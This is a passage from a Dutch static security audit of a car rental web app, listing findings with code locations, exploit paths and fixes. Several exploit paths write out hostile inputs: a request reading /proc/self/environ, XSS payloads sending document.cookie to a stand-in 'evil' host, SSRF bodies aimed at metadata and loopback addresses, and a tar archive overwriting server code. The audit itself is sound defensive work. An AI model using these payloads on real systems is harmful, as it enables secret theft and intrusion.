# Fase 8 — Statische security-review (read-only)

**Scope:** Car Rental Manager (Express 4 + Drizzle ORM 0.39.3 + Postgres, React-client, Node 20, Docker achter Coolify).
**Aard:** statische code-review. De applicatie is **niet** gedraaid; er is niets uitgevoerd tegen een live systeem. Alle exploitpaden hieronder zijn afgeleid uit de code, niet empirisch bevestigd.
**Datum:** 2026-09-09 · **Branch:** `feat/customer-portal`
**Reeds bekende bevindingen** (BUG-001, -002, -003, -005, -009, -010, -011, -012, -046, -051) zijn niet opnieuw afgeleid; waar een SEC-bevinding eraan raakt staat dat onder *Overlap*.

## Samenvatting per severity

| Severity | Aantal |
|---|---|
| Critical | 1 |
| High | 8 |
| Medium | 15 |
| Low | 10 |
| Info | 5 |
| **Totaal** | **39** |

Belangrijkste conclusie: er is **geen SQL-injectie** in deze codebase (zie *Confirmed OK*), maar de combinatie van (a) routes zonder autorisatie, (b) insert-schema's die pad-kolommen accepteren en (c) file-serving die niet door `resolveDocumentFilePath()` gaat, levert één ongeauthenticeerde arbitrary-file-read op.

---

## Bevindingen

### SEC-001 — Critical — Ongeauthenticeerde arbitrary file read via `receiptFilePath` van een expense

**Locatie:**
- `server/routes/expenses.ts:275` — `app.post("/api/expenses/with-receipt", expenseReceiptUpload.single('receiptFile'), …)` — **geen enkele auth-/permission-middleware**
- `server/routes/expenses.ts:298` — `const expenseData = insertExpenseSchema.parse(req.body);`
- `server/routes/expenses.ts:302-311` — `additionalData` wordt alléén gevuld als `req.file` bestaat; zonder upload blijft de body-waarde staan
- `server/routes/expenses.ts:314-319` — `storage.createExpense({ ...expenseData, ...additionalData })`
- `shared/schema.ts:1026-1032` — `insertExpenseSchema = createInsertSchema(expenses).omit({ id, createdAt, updatedAt, createdByUser, updatedByUser })` → **`receiptFilePath` (schema.ts:1009) blijft in het schema staan**
- `server/routes/expenses.ts:158` — `app.get("/api/expenses/:id/receipt", async (req, res) => …)` — **geen auth**
- `server/routes/expenses.ts:170-176` — `const filePath = path.resolve(expense.receiptFilePath); … res.sendFile(filePath)` — **geen containment-check**

**Evidence:** `path.resolve()` op een volledig door de aanvaller bepaalde string levert elk absoluut pad op; `res.sendFile()` met een absoluut pad doet zelf géén root-begrenzing (er wordt geen `{ root }` meegegeven). `POST /api/expenses` (regel 223) heeft wél `hasPermission(MANAGE_EXPENSES)`, de `with-receipt`-variant en beide PATCH-varianten (regel 341, 405) niet.

**Exploitpad (ongeauthenticeerd):**
1. `GET /` → server zet via `attachCsrfToken` (`server/middleware/security/csrf.ts:100-113`) een sessie plus `XSRF-TOKEN`-cookie voor iedere bezoeker, ook anoniem.
2. `POST /api/expenses/with-receipt` met die cookie + `X-CSRF-Token`-header en JSON-body
   `{"vehicleId":1,"category":"x","amount":"1","date":"2026-01-01","receiptFilePath":"/proc/self/environ"}` → 201 met het nieuwe `id`.
3. `GET /api/expenses/<id>/receipt` → de inhoud van `/proc/self/environ` wordt teruggestuurd, dus `DATABASE_URL`, `SESSION_SECRET`, `GEMINI_API_KEY`, `BACKUP_PATH`.
4. Met `SESSION_SECRET` zijn sessiecookies te vervalsen; met `DATABASE_URL` is de database direct benaderbaar als die netwerk-bereikbaar is. Ook `/app/dist/server/index.js`, `/etc/passwd`, `/proc/self/cmdline` en willekeurige `uploads/`-bestanden (contracten, rijbewijsscans) zijn zo leesbaar.

CSRF is hier geen barrière: de aanvaller stuurt de request zelf en kan het token gewoon ophalen.

**Fix (tekstueel):** zet `hasPermission(MANAGE_EXPENSES)` op alle vier de ongeguarde expense-routes én op `/api/expenses/:id/receipt`; verwijder `receiptFilePath`, `receiptFile`, `receiptFileSize`, `receiptContentType` en `receiptUrl` uit `insertExpenseSchema` (via `.omit()`), zodat alleen de server ze kan zetten; laat de receipt-route het pad oplossen via `resolveDocumentFilePath()` (`server/services/document-paths.ts:19`) in plaats van `path.resolve()`.

**Overlap:** verlengt BUG-003 (ongeauthenticeerde expenses-routes) van "schrijven/lezen van expense-data" naar "arbitrary file read van de container".

---

### SEC-002 — High — Standaard-admin `admin` / `admin123` wordt ook in productie aangemaakt

**Locatie:** `server/initAdmin.ts:21-23`, `server/initAdmin.ts:34-54`, `server/initAdmin.ts:85-101`

**Evidence:**
```
const defaultAdminUsername = process.env.DEFAULT_ADMIN_USERNAME || 'admin';
const defaultAdminPassword = process.env.DEFAULT_ADMIN_PASSWORD || 'admin123';
```
Er is geen `NODE_ENV`-check vóór het aanmaken; de productie-tak (regel 62-69) print alleen een herinnering *nadat* het account is aangemaakt. `displayDeploymentInfo()` (regel 88) logt bovendien letterlijk `DEFAULT_ADMIN_PASSWORD (default: admin123)` naar de container-logs. `initializeDefaultAdmin()` draait bij elke start (`server/index.ts:507`, `:538`), dus ook na een `restore-data` die de `users`-tabel heeft gewist.

**Exploitpad:** verse deploy (of deploy na database-restore) zonder `DEFAULT_ADMIN_PASSWORD` → inloggen als `admin`/`admin123` = volledige applicatie-overname. De login-limiter (5 pogingen/15 min, `server/middleware/security/rateLimiter.ts:28-35`) hindert een gerichte gok met bekende credentials niet.

**Fix:** in productie hard falen wanneer `DEFAULT_ADMIN_PASSWORD` ontbreekt (net als bij `SESSION_SECRET`), of een willekeurig wachtwoord genereren en dat één keer naar de log schrijven; het vaste `admin123` uit code én uit de deployment-info-log verwijderen.

---

### SEC-003 — High — Destructieve en muterende routes met alleen `requireAuth` (geen permissie-check)

**Locatie:**
- `server/routes.ts:4621` — `app.delete("/api/reservations/:id", requireAuth, …)` — soft-delete van elke reservering; bij `type === 'maintenance_block'` verwijdert dezelfde handler ook alle gekoppelde vervangings-reserveringen (`routes.ts:4649-4661`)
- `server/routes.ts:7303` — `app.delete("/api/interactive-damage-checks/:id", requireAuth, …)` — verwijdert schadecontroles inclusief bijbehorende PDF-documenten
- `server/routes.ts:7004` — `app.put("/api/interactive-damage-checks/:id", requireAuth, …)`
- `server/routes.ts:6849` — `app.post("/api/interactive-damage-checks", requireAuth, …)`
- `server/routes.ts:6572` — `app.post("/api/migrate/customer-drivers", requireAuth, …)` — massale datamigratie over alle klanten
- `server/routes.ts:4013` — `app.patch("/api/reservations/:id/spare-status", requireAuth, …)`
- `server/routes.ts:4464`, `:4567` — placeholder-reserveringen aanmaken/toewijzen
- `server/routes/vehicle-diagram-templates.ts:89`, `:138`, `:211` — templates aanmaken/wijzigen/verwijderen (inclusief `fs.promises.unlink`, regel 176 en 228)
- `server/routes/settings.ts:91`, `:122` — contractnummer-override zetten/verwijderen

**Evidence:** `requireAuth` (`server/auth.ts:202-207`) controleert uitsluitend `req.isAuthenticated()`. `hasPermission` (`server/middleware/permissions.ts:6`) wordt hier niet aangeroepen. Vergelijk `app.delete("/api/vehicles/:id", hasPermission(MANAGE_VEHICLES))` (`routes.ts:1624`) — daar staat de check wél.

**Exploitpad:** een account met alleen `view_vehicles` (of zelfs met een lege `permissions`-array) stuurt `DELETE /api/reservations/<id>` voor elk id en wist zo de volledige verhuuradministratie, inclusief cascade naar vervangingsreserveringen. Idem voor het verwijderen van schadecontroles (bewijsmateriaal bij schadeclaims).

**Fix:** `hasPermission(MANAGE_RESERVATIONS)` / `MANAGE_DAMAGE_CHECKS` / `MANAGE_VEHICLES` / `MANAGE_SETTINGS` toevoegen aan bovenstaande routes; `/api/migrate/*` achter `requireAdmin` zetten of geheel verwijderen. Overweeg een default-deny-wrapper zodat een nieuwe route zonder expliciete permissie 403 geeft in plaats van 200.

**Overlap:** zelfde klasse als BUG-003/BUG-011, maar dit zijn andere endpoints dan die daar genoemd worden.

---

### SEC-004 — High — Geauthenticeerde RCE via backup-restore: `tar -xzf` van een geüploade archive over `process.cwd()`

**Locatie:**
- `server/routes/backups.ts:354` — `await execAsync(\`tar -xzf "${req.file.path}" -C "${process.cwd()}"\`)` in `POST /api/backups/restore-code`, gevolgd door `process.exit(0)` (regel 384) om de app te laten herstarten
- `server/routes/backups.ts:485` — identieke `tar -xzf … -C "${process.cwd()}"` in `POST /api/backups/restore-files`, terwijl de route belooft alleen `uploads/` terug te zetten
- `server/backupService.ts:927-936` — `spawn('tar', ['-xzf', tempFile, '-C', extractPath, '--overwrite'])` met `extractPath = targetPath || process.cwd()`

**Evidence:** het archief komt rechtstreeks van de uploader. `validateAfterUpload(…, 'backup')` (`server/utils/security/fileUploadSecurity.ts:260`) controleert alleen extensie + gzip-magic, niet de inhoud van de archive-members. Er wordt geen `--strip-components`, geen `--exclude`, geen member-filter en geen doelvalidatie toegepast. Het werkdirectory is in de container `/app`, waar ook `dist/server/index.js` en `node_modules/` staan.

**Exploitpad:** gebruiker met `manage_backups` maakt lokaal `evil.tar.gz` met member `dist/server/index.js` (of `node_modules/<een-package>/index.js`), POST naar `/api/backups/restore-code`; de server overschrijft de applicatiecode en herstart zichzelf 2 seconden later → willekeurige code als de app-user. Dezelfde primitief zit in `restore-files`, waar de gebruiker denkt alleen uploads terug te zetten. Aanvullend: GNU tar volgt symlinks die in hetzelfde archief zijn aangemaakt, dus een member `uploads/x -> /` gevolgd door `uploads/x/etc/...` kan buiten `/app` schrijven.

**Fix:** extractie via de `tar`-npm-module met `{ strip, filter, onentry }` in plaats van de shell, of `tar --no-same-owner --no-overwrite-dir` met een expliciete member-allowlist; extraheren naar een tijdelijke directory, valideren dat elk pad na `path.resolve()` binnen `getUploadsDir()` valt, en pas dan verplaatsen. `restore-code` (code-deploy via HTTP) hoort in een gecontaineriseerde deploy helemaal niet te bestaan — verwijderen.

**Noot:** de npm-package `tar@7.4.3` staat wél in `package.json` maar wordt nergens geïmporteerd (`grep "from 'tar'"` → geen treffers). De node-tar path-traversal/hardlink-advisories zijn dus niet van toepassing; het risico zit in de systeem-`tar` via `exec`/`spawn`.

---

### SEC-005 — Medium — Path traversal bij schrijven in `POST /api/backups/upload` via `originalname`

**Locatie:** `server/routes/backups.ts:803-810`

**Evidence:**
```
const originalName = file.originalname.replace(/\.[^/.]+$/, "");
const extension = file.originalname.substring(file.originalname.lastIndexOf('.'));
const newFilename = `uploaded-${backupType}-${timestamp}-${originalName}${extension}`;
const destinationPath = path.join(backupDir, newFilename);
fs.renameSync(file.path, destinationPath);
```
`file.originalname` komt ongefilterd uit de `Content-Disposition` van de client; `sanitizeFilename()` (`server/utils/security/fileUploadSecurity.ts:81`) wordt hier — anders dan bij de diagram-, fuel-receipt- en fines-uploads — **niet** toegepast. `path.join` normaliseert `../` weg uit de basisdirectory.

**Exploitpad:** `manage_backups`-gebruiker uploadt met `filename="../../server/x.sql"` → het bestand belandt buiten `backups/`. De extensiecontrole (regel 785-795) beperkt het resultaat tot `.sql`/`.gz`/`.tar.gz`/`.tgz`, dus dit is een arbitrary-write met beperkte extensie — geen directe RCE, wel het overschrijven van bestaande dumps/archieven (bijvoorbeeld de veiligheidsback-up waar SEC-004 op leunt).

**Fix:** `sanitizeFilename(file.originalname)` gebruiken, of de originele naam volledig weggooien en alleen `uploaded-${type}-${timestamp}${ext}` schrijven; daarna verifiëren dat `path.resolve(destinationPath)` binnen `backupDir` valt.

---

### SEC-006 — High — SSRF: willekeurige host:port-verbinding via de CJIB-FTPS-testroute

**Locatie:**
- `server/routes/fines.ts:121-133` — `POST /api/fines/cjib-config/test`, guard `canManage = hasPermission(MANAGE_FINES)` (`fines.ts:30`)
- `server/services/cjib/config.ts:7-8` — `host: z.string().trim().max(200)`, `port: z.number().int().min(1).max(65535)` — geen hostname-/IP-allowlist
- `server/services/cjib/ftps-client.ts:15-28` — `client.access({ host: config.host, port: config.port, … })`
- `server/services/cjib/poller.ts:32-45` — dezelfde config wordt op een cron herhaald gebruikt

**Evidence:** de testroute gebruikt de **geposte** body, niet de opgeslagen config, en stuurt het resultaat terug: bij succes `{ ok: true, files: [...] }` (directory-listing van de tegenpartij), bij falen `res.status(502).json({ ok: false, message: (e as Error).message })` (`fines.ts:131`) — de rauwe socket-fout.

**Exploitpad:** `manage_fines`-gebruiker POST `{"host":"169.254.169.254","port":80,…}` of `{"host":"127.0.0.1","port":5432}`. Het onderscheid tussen `ECONNREFUSED`, TLS-fout en time-out is een betrouwbare oracle → volledige interne portscan en service-fingerprinting vanuit de container. Tegen een echte FTP(S)-host wordt de listing letterlijk teruggegeven (volledige read-SSRF). Via `PUT /api/fines/cjib-config` wordt de verbinding bovendien periodiek herhaald zonder verdere requests.

**Fix:** host valideren tegen een allowlist van CJIB-hostnames (of minimaal DNS resolven en private/link-local/loopback-ranges weigeren, inclusief na redirect/DNS-rebinding), de foutmelding generiek maken (`"Verbinding mislukt"`) en de listing in de testrespons weglaten of tot een count reduceren.

---

### SEC-007 — Medium — SSRF / portscan-oracle via de SMTP-testroute

**Locatie:** `server/routes/app-settings.ts:309-330` (`POST /api/app-settings/email/test`, guard `MANAGE_SETTINGS`) → `server/utils/email-service.ts:208-221` (`testSmtpConnection`), en `server/utils/email-service.ts:253-267` voor de opgeslagen transport.

**Evidence:** `smtpHost`/`smtpPort` komen ongevalideerd uit `req.body` (alleen een truthiness-check op regel 313). `transporter.verify()` classificeert de fout (`email-service.ts:142`, `:150`, `:168`) en die classificatie komt als `userMessage` terug bij de caller. Time-outs zijn 10 s.

**Exploitpad:** `manage_settings`-gebruiker POST `{"smtpHost":"127.0.0.1","smtpPort":6379,"smtpUser":"a","smtpPassword":"b"}` en leest aan het onderscheid open/dicht/timeout af welke interne poorten leven. Blind qua inhoud (SMTP-handshake), maar volledig bruikbaar als scanner.

**Fix:** zelfde als SEC-006 — private ranges weigeren en de foutclassificatie niet uitsplitsen naar de client.

---

### SEC-008 — High — Stored XSS via `javascript:`-URL's in `window.open()`

**Locatie:**
- `client/src/components/expenses/expense-view-dialog.tsx:386` — `window.open(expense.receiptUrl, '_blank')`; het veld is een vrij tekstveld in `client/src/components/expenses/expense-form.tsx:493`, kolom `receipt_url` is `text` (`shared/schema.ts:1007`) zonder `z.string().url()`
- `client/src/components/reservations/pickup-return-dialogs.tsx:737`, `:1538` — `window.open(check.pdfPath, '_blank')`; `pdfPath` is client-zetbaar via `POST /api/interactive-damage-checks` (die route heeft bovendien alleen `requireAuth`, zie SEC-003)
- `client/src/components/reservations/pickup-return-dialogs.tsx:782`, `:1583` en `client/src/components/reservations/reservation-documents-dialog.tsx:154` — `window.open(doc.filePath, '_blank')`

**Evidence:** de globale `sanitizeInput` (`server/middleware/security/sanitization.ts:41`) strip HTML-tags maar laat een string zonder `<` volledig intact — `javascript:fetch('//evil/'+document.cookie)` passeert ongewijzigd. Er is nergens in `client/src` een URL-scheme-check en `DOMPurify` wordt client-side niet geïmporteerd.

**Exploitpad:** aanvaller met `manage_expenses` (of iedere ingelogde gebruiker, voor de damage-check-variant) slaat een `javascript:`-URL op; een collega opent het detailvenster en klikt het oog-icoon → script draait op de app-origin. De sessiecookie is `httpOnly`, maar de aanvaller kan wel namens het slachtoffer API-calls doen (CSRF-token is JS-leesbaar, `csrf.ts:108`), bijvoorbeeld `PATCH /api/users/<eigen-id>` met `role: "admin"` als het slachtoffer `manage_users` heeft (zie SEC-010).

**Fix:** één gedeelde `isSafeHttpUrl()`-helper vóór elke `window.open(<db-string>)`, die alleen `http:`/`https:` en relatieve paden toestaat; daarnaast `z.string().url()` op `receiptUrl` en `receiptFilePath`/`pdfPath`/`filePath` uit de insert-schema's `.omit()`-en zodat ze niet client-zetbaar zijn.

---

### SEC-009 — High — DOM-XSS via `innerHTML` met `driver.licenseFilePath`

**Locatie:** `client/src/components/customers/driver-view-dialog.tsx:165` (payload op `:168`), trigger via de `onError` van de `<img>` op `:156`.

**Evidence:** de waarde wordt rauw geïnterpoleerd in `<a href="/${driver.licenseFilePath}">`. `insertDriverSchema` (`shared/schema.ts:417`) omit alleen `id`, `createdAt`, `updatedAt`, `createdByUser`, `updatedByUser` — `licenseFilePath` is dus client-zetbaar, onder meer via `POST /api/portal/drivers` (`server/routes/portal.ts:463`, waar `{ ...parsed.data }` doorgaat) en de staff-driver-routes.

**Exploitpad:** sla `x" onmouseover="fetch('//evil/'+document.cookie)` op als `licenseFilePath`. Er zit geen `<` in, dus de server-side tag-stripper laat het staan. Het bogus pad zorgt dat de `<img>` faalt, `onError` vuurt, en de attribuut-breakout wordt in het DOM geschreven. Self-triggering zodra een medewerker de chauffeurskaart opent.

**Fix:** het fallback-blok opbouwen met `document.createElement` + `textContent`/`setAttribute` (zoals `client/src/components/barcodes/key-label-print.ts:139` al correct doet) in plaats van `innerHTML`; `licenseFilePath` server-side zetten en uit het insert-schema omitten.

---

### SEC-010 — High — Mass assignment op `PATCH /api/users/:id`: `manage_users` → admin + wachtwoordreset van elk account

**Locatie:** `server/routes/users.ts:135-237`, in het bijzonder `:184-188` en `:191-197`; opslag in `server/database-storage.ts:151-171`.

**Evidence:**
```
userData = { ...req.body, updatedBy: currentUser.username };   // regel 184-187
if (!isAdmin && !hasManageUsersPermission) {                    // regel 191
  delete userData.role; delete userData.permissions; delete userData.active; delete userData.hidePrices;
}
```
Wie `manage_users` heeft maar géén admin is, komt niet in het `delete`-blok. Er is geen zod-schema op deze route (`updateUserSchema` bestaat wel in `shared/schema.ts:158` maar wordt hier niet gebruikt), dus élke kolom uit `users` is schrijfbaar, inclusief `id`, `createdAt` en `createdBy`. Daarnaast: `if (userData.password)` (regel 200) → `storage.updateUserPassword(id, …)` op een willekeurig `:id`.

**Exploitpad:**
1. `PATCH /api/users/<eigen-id>` met `{"role":"admin"}` → volledige rechten (`hasPermission` geeft admins alles, `permissions.ts:14`).
2. Of `PATCH /api/users/<admin-id>` met `{"password":"x"}` → overname van het admin-account zonder het oude wachtwoord te kennen; `POST /api/users/change-password` (`users.ts:349`) vraagt wél om het huidige wachtwoord, deze route niet.
3. `POST /api/users` (`users.ts:92`) accepteert `role` en `permissions` rechtstreeks via `insertUserSchema` (`shared/schema.ts:144-156`) → direct een tweede admin aanmaken.

**Fix:** `updateUserSchema.partial().parse(req.body)` gebruiken in plaats van de spread; roluitbreiding naar `admin` én wachtwoordwijziging van een ander account beperken tot `requireAdmin` plus her-authenticatie (`/api/reauthenticate` bestaat al); `id`/`createdAt`/`createdBy` nooit uit de body accepteren.

**Overlap:** BUG-001 (manager self-promotion) — de wachtwoordreset-variant en de ontbrekende schema-validatie zijn aanvullend.

---

### SEC-011 — High — Arbitrary file delete via `backgroundPath` in de template-PATCH-routes

**Locatie:**
- `server/routes/pdf-templates.ts:193-245` — `PATCH /api/pdf-templates/:id`; `const requestBody = { ...req.body }` (regel 213) en expliciet behoud van `backgroundPath` (regel 235-238), zonder zod-validatie
- `server/routes/pdf-templates.ts:342-344` — `const oldBackgroundPath = path.join(process.cwd(), template.backgroundPath); await fs.promises.unlink(oldBackgroundPath);`
- `server/routes/pdf-templates.ts:429-431` en `:440-441` — zelfde `unlink` bij `DELETE /api/pdf-templates/:id/background`
- `server/routes/pdf-templates.ts:648-649`, `:658-659` — idem voor background-library-items
- Identieke patronen: `server/routes/damage-check-templates.ts:351`, `:383`, `:484`; `server/routes/report-and-label-templates.ts:278`, `:310`, `:412`; `server/routes/vehicle-diagram-templates.ts:174-176`, `:226-228`

**Evidence:** `path.join(process.cwd(), <db-string>)` normaliseert `../` weg uit `process.cwd()`. Er is geen containment-check en `resolveDocumentFilePath()` wordt hier niet gebruikt (in `server/routes/fines.ts:243` en `server/routes/portal.ts:197` wél).

**Exploitpad:** gebruiker met `manage_pdf_templates` doet `PATCH /api/pdf-templates/1` met `{"backgroundPath":"../../app/dist/server/index.js"}` (of `dist/public/index.html`, `schema-columns.json`, een backup-bestand) en daarna `DELETE /api/pdf-templates/1/background` → het bestand wordt verwijderd. Herhaalbaar → DoS van de applicatie of vernietiging van back-ups. Voor `vehicle-diagram-templates` is de PATCH-route zelfs alleen `requireAuth` (SEC-003), dus daar volstaat élk ingelogd account.

**Fix:** `backgroundPath`/`backgroundPreviewPath`/`diagramPath`/`previewPath` niet uit de request-body accepteren (server-side genereren), en elke `unlink`/`read` op een DB-pad door `resolveDocumentFilePath()` halen, dat containment binnen `getUploadsDir()` afdwingt.

**Overlap:** zelfde klasse als BUG-012 (documents path containment), maar op andere routes.

---

### SEC-012 — Medium — CSP staat `unsafe-inline` en `unsafe-eval` toe, ook in productie

**Locatie:** `server/middleware/security/headers.ts:14-19`

**Evidence:**
```
scriptSrc: ["'self'", "'unsafe-inline'", // Required for Vite in development
            "'unsafe-eval'",             // Required for Vite in development
            "https://cdn.jsdelivr.net"],
```
De comment noemt development, maar er is geen `process.env.NODE_ENV`-conditie — anders dan bij `upgradeInsecureRequests` (regel 46). Ook `imgSrc: ["https:"]` (regel 34) staat exfiltratie via image-beacons naar elke HTTPS-host toe, en `connectSrc` bevat `ws:`/`wss:` zonder host-restrictie.

**Exploitpad:** de CSP levert geen enkele mitigatie voor SEC-008/SEC-009; een injectie die anders geblokkeerd zou worden, draait gewoon.

**Fix:** `unsafe-inline`/`unsafe-eval` alleen toevoegen wanneer `NODE_ENV !== 'production'`; `cdn.jsdelivr.net` schrappen als er geen CDN-script geladen wordt; `imgSrc` beperken tot `'self' data: blob:`; `connectSrc` beperken tot de eigen origin.

---

### SEC-013 — Medium — De request-logger schrijft volledige JSON-responsebodies naar de log

**Locatie:** `server/index.ts:249-266`, in het bijzonder `:263`

**Evidence:**
```
const originalResJson = res.json;
res.json = function (bodyJson) { capturedJsonResponse = bodyJson; … };
…
if (capturedJsonResponse) logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
if (logLine.length > 200) logLine = logLine.slice(0, 199) + "…";
```
Elke `/api`-respons wordt gelogd, afgekapt op 200 tekens. Kleine responses gaan dus volledig de log in: `GET /api/settings/key/smtp_password` (zie SEC-014), `POST /api/app-settings/email/test`, `GET /api/user`, portal-token-responses, `GET /api/backups/health` (bevat `backupPath`).

**Exploitpad:** iedereen met toegang tot de Coolify-/Docker-logs (of tot een gearchiveerde logbundel) leest secrets die verder achter permissies zitten. Geen aanvaller nodig — het is een permanent leklek in de log.

**Fix:** het loggen van responsebodies uitzetten, of een allowlist van paden hanteren en bekende geheime sleutels (`smtpPassword`, `password`, `token`, `cjibPassword`) redacten vóór `JSON.stringify`.

**Overlap:** versterkt BUG-010.

---

### SEC-014 — Medium — `/api/settings*` geeft het SMTP-wachtwoord ongeredacteerd terug

**Locatie:** `server/routes/settings.ts:15-49` (`GET /api/settings`, `/api/settings/category/:category`, `/api/settings/key/:key`, alle drie `hasPermission(MANAGE_BACKUPS)`), en `server/routes/app-settings.ts:294-303` (`GET /api/app-settings/:category`, `MANAGE_SETTINGS`).

**Evidence:** de redactie-helper `redactAppSetting` (`server/routes/app-settings.ts:27-33`, `value: { …, smtpPassword: '' }`) wordt alleen toegepast in `GET /api/app-settings` (`app-settings.ts:39`) en `GET /api/app-settings/key/:key` (`app-settings.ts:213`). De routes in `server/routes/settings.ts` geven `storage.getAllAppSettings()` / `getAppSettingsByCategory()` rechtstreeks door.

**Exploitpad:** een gebruiker met `manage_backups` (een back-upoperator, niet noodzakelijk een beheerder) leest via `GET /api/settings` het SMTP-wachtwoord en kan mail versturen namens het bedrijf.

**Fix:** `redactAppSetting` toepassen op álle read-paden van `app_settings`; het wachtwoord bij voorkeur helemaal niet retourneren en een `hasPassword: boolean` teruggeven.

**Overlap:** BUG-010.

---

### SEC-015 — Medium — TLS-certificaatvalidatie uitgeschakeld voor alle uitgaande SMTP

**Locatie:** `server/utils/email-service.ts:216-218` (test-transport) en `server/utils/email-service.ts:261-263` (verzend-transport)

**Evidence:** `tls: { rejectUnauthorized: false }` op beide transports, met als comment "Allow certificate validation bypass for servers with certificate mismatches". Aanvullend: `server/utils/email-service.ts:97-105` bepaalt `smtpSecure` met `value.smtpPort === '465'` — een string-vergelijking die `false` oplevert zodra de poort als getal is opgeslagen, waardoor STARTTLS-onderhandeling stilzwijgend kan wegvallen.

**Exploitpad:** een netwerk-MITM tussen container en mailserver kan het certificaat vervangen en zo SMTP-credentials plus de volledige inhoud van uitgaande mail (contracten, boetebrieven, portal-uitnodigingslinks met activatietokens) onderscheppen. De uitnodigingstokens uit `server/services/portal-tokens.ts:10` geven directe accountovername in het klantportaal.

**Fix:** `rejectUnauthorized: true`; als één specifieke mailserver een mismatch heeft, dat oplossen met een expliciete `ca`/`servername` in plaats van globale uitschakeling. `smtpSecure` afleiden met `Number(port) === 465`.

---

### SEC-016 — Medium — Geauthenticeerde open mail relay met door de aanvaller geschreven HTML en bijlagen

**Locatie:**
- `server/routes.ts:5226`, `:5266-5290` — `POST /api/documents/:id/email`: `recipients` uit `req.body`, `.split(',')`, `subject` en `message` uit de body, `message` alleen `\n → <br>` (regel 5276), plus documentbijlage
- `server/routes.ts:5374-5380` — `recipientEmail` uit `req.body` met meerdere bijlagen
- `server/routes/notifications.ts:432-437` — `recipientEmail` uit de request
- `server/utils/email-service.ts:276` — `from: \`"${config.fromName}" <${config.fromEmail}>\`` (rauwe interpolatie van DB-strings in een header)

**Evidence:** geen allowlist op ontvangers, geen HTML-escaping van `message`/`subject`, wel de bedrijfs-`from` en dus de bedrijfsreputatie/SPF.

**Exploitpad:** een gebruiker met `manage_documents` verstuurt vanaf het bedrijfsdomein een phishingmail met eigen HTML naar een willekeurig adres, met een echt bedrijfsdocument als bijlage. Ook bruikbaar om documenten te exfiltreren naar een extern adres.

**Fix:** ontvangers beperken tot adressen die aan de betreffende klant/reservering hangen (of tot een geconfigureerde allowlist), `subject`/`message` HTML-escapen vóór het in de body gaat, en `fromName`/`fromEmail` valideren op CR/LF en op e-mailformaat.

---

### SEC-017 — Medium — `X-Forwarded-For` wordt onvoorwaardelijk vertrouwd voor audit-log- en sessie-IP's

**Locatie:** `server/utils/security/auditLogger.ts:103-106` en `server/utils/security/sessionManager.ts:175-181`

**Evidence:**
```
const forwarded = req.get('x-forwarded-for');
if (forwarded) return forwarded.split(',')[0].trim();
```
Er wordt de **eerste** waarde genomen — precies het deel dat de client zelf zet — in plaats van `req.ip`, dat door `app.set("trust proxy", 1)` (`server/auth.ts:135`) correct één proxy-hop terugrekent.

**Exploitpad:** aanvaller stuurt `X-Forwarded-For: 10.0.0.99` bij elke request; de activity log (`audit_logs`) en de tabel `active_sessions` registreren dat adres. Forensisch onderzoek naar bijvoorbeeld het verwijderde-voertuig-incident wijst daarmee naar een verzonnen IP. De "nieuw apparaat"-mail van het portaal (`server/portal-auth.ts:100`) gebruikt wel `req.ip` en is dus niet aangetast.

**Fix:** overal `req.ip` gebruiken (Express past `trust proxy` al toe) en de eigen `getClientIp`-helpers verwijderen.

**Overlap:** BUG-009 — zelfde header, andere sink.

---

### SEC-018 — Medium — Portal-sessies vallen terug op een hardgecodeerd secret

**Locatie:** `server/portal-auth.ts:163` — `secret: process.env.SESSION_SECRET || "portal-dev-secret"`

**Evidence:** de staff-stack heeft hiervoor een expliciete afhandeling met een willekeurig secret plus luide waarschuwing (`server/auth.ts:67-85`); de portal-stack niet. `"portal-dev-secret"` staat in een publieke repo.

**Exploitpad:** draait de container zonder `SESSION_SECRET` (mogelijk — `resolveSessionSecret` logt dan alleen een fout en gaat door), dan zijn portal-cookies te ondertekenen met een bekend secret. Sessiegegevens staan server-side in Postgres, dus dit geeft niet direct een geldige sessie; het maakt wel sessiefixatie en het geldig maken van een geraden/gelekt `sid` triviaal, en het maskeert de misconfiguratie in plaats van hem te melden.

**Fix:** dezelfde `resolveSessionSecret()` gebruiken als de staff-stack, en in productie hard falen zonder `SESSION_SECRET`.

---

### SEC-019 — Medium — Mass assignment op `PATCH /api/reservations/:id` (rauwe body naar `db.update()`)

**Locatie:** `server/routes.ts:3517` — `const reservationData = req.body;` met de comment *"For updates, bypass full schema validation and just use the raw data"* → `server/database-storage.ts:1209-1246` (`.set(dataToUpdate)`).

**Evidence:** `insertReservationSchemaBase` (`shared/schema.ts:802-808`) omit netjes `id`, `createdAt`, `updatedAt`, `createdByUser`, `updatedByUser`, `deletedAt` — maar dat schema wordt op de PATCH-route niet toegepast. Alle echte kolommen zijn dus schrijfbaar: `id`, `deletedAt`, `deletedBy`, `createdBy`, `contractNumber`, `status`, `type`.

**Exploitpad:** `manage_reservations`-gebruiker doet `PATCH /api/reservations/5` met `{"id": 9999}` → de primaire sleutel verspringt en alle verwijzingen (documenten, schadecontroles, transporten, boetes) wijzen naar een niet-bestaande rij. Of `{"deletedBy":"iemand-anders"}` om de audit trail te vervalsen. `deletedAt` terugzetten naar `null` omzeilt de prullenbak-workflow.

**Fix:** `insertReservationSchemaBase.partial().parse(req.body)` toepassen (zoals `/api/customers` op `routes.ts:2072` al doet) en de audit-/soft-delete-velden server-side blijven zetten.

---

### SEC-020 — Medium — `/uploads` is statisch bereikbaar voor élke ingelogde medewerker

**Locatie:** `server/index.ts:336-338` — `app.use('/uploads', requireAuth, express.static(uploadsPath))`

**Evidence:** alleen `requireAuth`, geen permissiecheck. Onder `uploads/` staan contracten, rijbewijsscans (`uploads/drivers`), schadecontrolefoto's, boetebrieven (`uploads/fines`) en portal-bijlagen (`uploads/portal-requests`). De portal-routes (`server/routes/portal.ts:193`, `:220`, `:289`) doen wél per-klant scoping, maar die scoping is via `/uploads/<pad>` te omzeilen zodra iemand een staff-account heeft.

Aanvullend: `uploadsPath` is hier hardgecodeerd als `path.join(process.cwd(), 'uploads')`, terwijl de rest van de code `getUploadsDir()` gebruikt (`shared/paths.ts:12`), dat `UPLOADS_DIR` respecteert. Met een gezette `UPLOADS_DIR` serveert deze mount een andere (mogelijk lege) directory dan waar de app schrijft — dezelfde klasse fout die `shared/paths.ts:5-10` beschrijft.

